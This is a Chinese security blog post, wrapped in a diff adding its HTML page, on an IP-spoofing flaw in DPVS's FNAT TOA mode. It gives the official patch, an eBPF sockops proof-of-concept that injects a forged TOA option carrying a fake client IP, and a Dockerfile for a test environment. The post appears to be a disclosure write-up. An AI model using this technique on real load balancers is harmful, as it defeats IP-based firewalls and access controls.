@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Appl3s">
+
+
+
+
+
+<title>TOA ip伪造 | Appl3s的博客</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Appl3s&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Appl3s&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">TOA ip伪造</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Appl3s</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">December 5, 2023&nbsp;&nbsp;11:21:17</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>最近在网络上关注到一些有意思的漏洞，来自CFC4N大佬</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzUyMDM0OTY5NA==&mid=2247484794&idx=1&sn=002d06d096f0421d194cfe7a2ccad952">L4LB网络中间件DPVS在FNAT TOA模式存在IP伪造漏洞</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.ctfiot.com/149666.html">L4LB网络中间件DPVS在FNAT TOA模式存在IP伪造漏洞</a></li>
+</ul>
+<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>IP在很多Web防火墙、反爬虫系统、防刷系统（薅羊毛）是用于做策略控制的基础强依赖，IP的伪造将导致这些系统完全失效，造成极大的风险损失。</p>
+<p>IP同样被用于后台系统的ACL的网络边界，此漏洞也依旧成为可以突破的入口。攻击者可伪造IDC公网IP、内网IP等，实现特定IP加白，甚至直接放行等等。</p>
+<h3 id="官方补丁如下"><a href="#官方补丁如下" class="headerlink" title="官方补丁如下"></a>官方补丁如下</h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">Index: src/ipvs/ip_vs_proto_tcp.c</span></span><br><span class="line">IDEA additional info:</span><br><span class="line">Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP</span><br><span class="line">&lt;+&gt;UTF-8</span><br><span class="line"><span class="comment">===================================================================</span></span><br><span class="line"><span class="comment">diff --git a/src/ipvs/ip_vs_proto_tcp.c b/src/ipvs/ip_vs_proto_tcp.c</span></span><br><span class="line"><span class="comment">--- a/src/ipvs/ip_vs_proto_tcp.c (revision 30e558898060f33a2595c6545253eddd692ecd20)</span></span><br><span class="line"><span class="comment">+++ b/src/ipvs/ip_vs_proto_tcp.c (revision 669c54d067cfd4dbceae3304c1d1aa5a6031a7f7)</span></span><br><span class="line"><span class="meta">@@ -305,6 +305,48 @@</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+/* use NOP option to replace TCP_OLEN_IP4_ADDR and TCP_OLEN_IP6_ADDR opt */</span></span><br><span class="line"><span class="addition">+static void tcp_in_remove_toa(struct tcphdr *tcph, int af)</span></span><br><span class="line"><span class="addition">+&#123;</span></span><br><span class="line"><span class="addition">+    unsigned char *ptr;</span></span><br><span class="line"><span class="addition">+    int len, i;</span></span><br><span class="line"><span class="addition">+    uint32_t tcp_opt_len = af == AF_INET ? TCP_OLEN_IP4_ADDR : TCP_OLEN_IP6_ADDR;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    ptr = (unsigned char *)(tcph + 1);</span></span><br><span class="line"><span class="addition">+    len = (tcph-&gt;doff &lt;&lt; 2) - sizeof(struct tcphdr);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+    while (len &gt; 0) &#123;</span></span><br><span class="line"><span class="addition">+        int opcode = *ptr++;</span></span><br><span class="line"><span class="addition">+        int opsize;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        switch (opcode) &#123;</span></span><br><span class="line"><span class="addition">+        case TCP_OPT_EOL:</span></span><br><span class="line"><span class="addition">+            return;</span></span><br><span class="line"><span class="addition">+        case TCP_OPT_NOP:</span></span><br><span class="line"><span class="addition">+            len--;</span></span><br><span class="line"><span class="addition">+            continue;</span></span><br><span class="line"><span class="addition">+        default:</span></span><br><span class="line"><span class="addition">+            opsize = *ptr++;</span></span><br><span class="line"><span class="addition">+            if (opsize &lt; 2)    /* silly options */</span></span><br><span class="line"><span class="addition">+                return;</span></span><br><span class="line"><span class="addition">+            if (opsize &gt; len)</span></span><br><span class="line"><span class="addition">+                return;    /* partial options */</span></span><br><span class="line"><span class="addition">+            if ((opcode == TCP_OPT_ADDR) &amp;&amp; (opsize == tcp_opt_len)) &#123;</span></span><br><span class="line"><span class="addition">+                for (i = 0; i &lt; tcp_opt_len; i++) &#123;</span></span><br><span class="line"><span class="addition">+                    *(ptr - 2 + i) = TCP_OPT_NOP;</span></span><br><span class="line"><span class="addition">+                &#125;</span></span><br><span class="line"><span class="addition">+                /* DON&#x27;T RETURN</span></span><br><span class="line"><span class="addition">+                 * keep search other TCP_OPT_ADDR ,and clear them.</span></span><br><span class="line"><span class="addition">+                 * See https://github.com/iqiyi/dpvs/pull/925 for more detail. */</span></span><br><span class="line"><span class="addition">+            &#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+            ptr += opsize - 2;</span></span><br><span class="line"><span class="addition">+            len -= opsize;</span></span><br><span class="line"><span class="addition">+            break;</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> static inline int tcp_in_add_toa(struct dp_vs_conn *conn, struct rte_mbuf *mbuf,</span><br><span class="line">                           struct tcphdr *tcph)</span><br><span class="line"> &#123;</span><br><span class="line"><span class="meta">@@ -719,14 +761,25 @@</span></span><br><span class="line">      */</span><br><span class="line">     if (th-&gt;syn &amp;&amp; !th-&gt;ack) &#123;</span><br><span class="line">         tcp_in_remove_ts(th);</span><br><span class="line"><span class="addition">+</span></span><br><span class="line">         tcp_in_init_seq(conn, mbuf, th);</span><br><span class="line"><span class="deletion">-        tcp_in_add_toa(conn, mbuf, th);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"><span class="addition">+        /* Only clear when adding TOA fails to reduce invocation frequency and improve performance.</span></span><br><span class="line"><span class="addition">+         * See https://github.com/iqiyi/dpvs/pull/925 for more detail. */</span></span><br><span class="line"><span class="addition">+        if (unlikely(tcp_in_add_toa(conn, mbuf, th) != EDPVS_OK)) &#123;</span></span><br><span class="line"><span class="addition">+            tcp_in_remove_toa(th, af);</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     /* add toa to first data packet */</span><br><span class="line">     if (ntohl(th-&gt;ack_seq) == conn-&gt;fnat_seq.fdata_seq</span><br><span class="line"><span class="deletion">-            &amp;&amp; !th-&gt;syn &amp;&amp; !th-&gt;rst /*&amp;&amp; !th-&gt;fin*/)</span></span><br><span class="line"><span class="deletion">-        tcp_in_add_toa(conn, mbuf, th);</span></span><br><span class="line"><span class="addition">+            &amp;&amp; !th-&gt;syn &amp;&amp; !th-&gt;rst /*&amp;&amp; !th-&gt;fin*/) &#123;</span></span><br><span class="line"><span class="addition">+        /* Only clear when adding TOA fails to reduce invocation frequency and improve performance.</span></span><br><span class="line"><span class="addition">+         * See https://github.com/iqiyi/dpvs/pull/925 for more detail. */</span></span><br><span class="line"><span class="addition">+        if (unlikely(tcp_in_add_toa(conn, mbuf, th) != EDPVS_OK)) &#123;</span></span><br><span class="line"><span class="addition">+            tcp_in_remove_toa(th, af);</span></span><br><span class="line"><span class="addition">+        &#125;</span></span><br><span class="line"><span class="addition">+    &#125;</span></span><br><span class="line"> </span><br><span class="line">     tcp_in_adjust_seq(conn, th);</span><br></pre></td></tr></table></figure>
+
+<h2 id="复现路径"><a href="#复现路径" class="headerlink" title="复现路径"></a>复现路径</h2><p>根据一些公开线索，我复现了相关的POC<br>可以在支持ebpf的系统上轻松实现，挂载点在<code>sockops</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">SEC(<span class="string">&quot;sockops&quot;</span>)</span><br><span class="line"><span class="type">int</span> <span class="title function_">bpf_sockops_toa</span><span class="params">(<span class="keyword">struct</span> bpf_sock_ops *skops)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> op = (<span class="type">int</span>) skops-&gt;op;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span>(op) &#123;</span><br><span class="line">		<span class="keyword">case</span> BPF_SOCK_OPS_TCP_CONNECT_CB:</span><br><span class="line">			<span class="comment">//bpf_printk(&quot;BPF_SOCK_OPS_TCP_CONNECT_CB&quot;);</span></span><br><span class="line">		<span class="keyword">case</span> BPF_SOCK_OPS_PASSIVE_ESTABLISHED_CB: <span class="comment">// 设置flag</span></span><br><span class="line">			<span class="comment">//sockops_set_hdr_cb_flags</span></span><br><span class="line">			bpf_sock_ops_cb_flags_set(skops,</span><br><span class="line">				skops-&gt;bpf_sock_ops_cb_flags |</span><br><span class="line">				BPF_SOCK_OPS_WRITE_HDR_OPT_CB_FLAG);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> BPF_SOCK_OPS_HDR_OPT_LEN_CB: <span class="comment">// 保留长度</span></span><br><span class="line">			<span class="comment">//bpf_printk(&quot;BPF_SOCK_OPS_HDR_OPT_LEN_CB&quot;);</span></span><br><span class="line">			bpf_reserve_hdr_opt(skops, <span class="keyword">sizeof</span>(toav4), <span class="number">0</span>);</span><br><span class="line">			<span class="comment">// bpf_reserve_hdr_opt(skops, sizeof(toav6), 0);</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> BPF_SOCK_OPS_WRITE_HDR_OPT_CB: <span class="comment">// 写入</span></span><br><span class="line">			<span class="comment">//bpf_printk(&quot;BPF_SOCK_OPS_WRITE_HDR_OPT_CB&quot;);</span></span><br><span class="line">			sockops_tcp_store_hdr(skops);</span><br><span class="line">			bpf_printk(<span class="string">&quot;TOA ebpf written&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>伪造的IP主要在结构体中替换</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">toa_v4_data</span> <span class="title">toav4</span> =</span> &#123;</span><br><span class="line">	.kind = <span class="number">254</span>,</span><br><span class="line">	.len = <span class="keyword">sizeof</span>(toav4),</span><br><span class="line">	.port = <span class="number">8080</span>,</span><br><span class="line">	.ip = bpf_htonl(<span class="number">0x04040404</span>),</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">toa_v6_data</span> <span class="title">toav6</span> =</span> &#123;</span><br><span class="line">	.kind = <span class="number">253</span>,</span><br><span class="line">	.len = <span class="keyword">sizeof</span>(toav6),</span><br><span class="line">	.port = <span class="number">8080</span>,</span><br><span class="line">	.ip6 = &#123;</span><br><span class="line">		.in6_u.u6_addr32 = &#123;</span><br><span class="line">			bpf_htonl(<span class="number">0x20010000</span>), <span class="number">0x00</span>,<span class="number">0x00</span>, bpf_htonl(<span class="number">0x00008888</span>)</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h2 id="环境部署"><a href="#环境部署" class="headerlink" title="环境部署"></a>环境部署</h2><p>为了方便测试，我也编写了Dockerfile用于快速验证，项目源码见<a target="_blank" rel="noopener" href="https://github.com/appl3s/ebpf-toa">ebpf-toa</a></p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:latest</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install -y build-essential git cmake \</span></span><br><span class="line"><span class="language-bash">                       zlib1g-dev libevent-dev \</span></span><br><span class="line"><span class="language-bash">                       libelf-dev llvm \</span></span><br><span class="line"><span class="language-bash">                       clang libc6-dev-i386 \</span></span><br><span class="line"><span class="language-bash">                       vim wget \ </span></span><br><span class="line">                        nodejs npm \</span><br><span class="line">                        &amp;&amp; wget -O /tmp/go.tar.gz https://go.dev/dl/go1.<span class="number">21.4</span>.linux-amd64.tar.gz \ </span><br><span class="line">                        &amp;&amp; tar zxvf /tmp/go.tar.gz -C /opt \ </span><br><span class="line">                        &amp;&amp; rm /tmp/*.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">rm</span> -rf /var/cache/apt/archives/ &amp;&amp; <span class="built_in">mkdir</span> /src &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    git init</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /src</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Link asm/byteorder.h into eBPF</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">ln</span> -s /usr/include/x86_64-linux-gnu/asm/ /usr/include/asm</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Build libbpf as a static lib</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> git <span class="built_in">clone</span> https://github.com/libbpf/libbpf-bootstrap.git &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cd</span> libbpf-bootstrap &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    git submodule update --init --recursive</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cd</span> libbpf-bootstrap/libbpf/src &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    make BUILD_STATIC_ONLY=y &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    make install BUILD_STATIC_ONLY=y LIBDIR=/usr/lib/x86_64-linux-gnu/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Clones the linux kernel repo and use the latest linux kernel source BPF headers and checkout target linux version</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> git <span class="built_in">clone</span> -b v5.10 --depth 1 git://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> linux/include/uapi/linux/bpf* /usr/include/linux/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> PATH  /opt/go/bin:$PATH</span><br></pre></td></tr></table></figure>
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Appl3s</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2023/12/05/toa/">http://example.com/2023/12/05/toa/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2025 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/ebpf/"># ebpf</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2018/10/06/php-extensions-function/">php-extensions-function</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Appl3s | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
